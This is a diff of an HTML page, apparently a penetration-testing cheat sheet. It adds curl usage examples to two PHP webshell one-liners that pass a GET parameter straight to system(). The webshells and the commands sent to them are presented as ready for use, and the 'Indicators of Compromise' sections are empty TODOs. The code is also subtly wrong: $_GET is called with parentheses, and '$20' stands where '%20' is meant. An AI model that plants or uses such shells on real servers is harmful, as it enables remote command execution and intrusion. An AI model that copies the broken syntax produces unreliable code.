@@ -392,11 +392,19 @@ stty rows &lt;rows&gt; cols &lt;columns&gt;
 <p>This is the shortest possible PHP webshell, the output from commands ran are not very pretty and will likely get mangled:</p>
 <pre><code class="language-php">&lt;?php system($_GET('cmd')); ?&gt;
 </code></pre>
+<p>To use this webshell, the command must be url encoded and must be formatted like so:</p>
+<pre><code class="language-bash">curl http://ip/shell.php?cmd=whoami
+curl http://ip/shell.php?cmd=ip$20a
+</code></pre>
 <h4 id="indicators-of-compromise-7"><a class="header" href="#indicators-of-compromise-7">Indicators of Compromise</a></h4>
 <p>TODO</p>
 <h3 id="method-2---slightly-prettier"><a class="header" href="#method-2---slightly-prettier">Method 2 - Slightly Prettier</a></h3>
 <p>This basic webshell wraps the output of the command into HTML pre tags, this will usually help prevent the output of the command from being mangled on the page.</p>
 <pre><code class="language-php">&lt;?php echo &quot;&lt;pre&gt;&quot;; system($_GET('cmd')); echo &quot;&lt;/pre&gt;&quot;; ?&gt;
+</code></pre>
+<p>To use this webshell, the command must be url encoded and must be formatted like so:</p>
+<pre><code class="language-bash">curl http://ip/shell.php?cmd=whoami
+curl http://ip/shell.php?cmd=ip$20a
 </code></pre>
 <h4 id="indicators-of-compromise-8"><a class="header" href="#indicators-of-compromise-8">Indicators of Compromise</a></h4>
 <p>TODO</p>
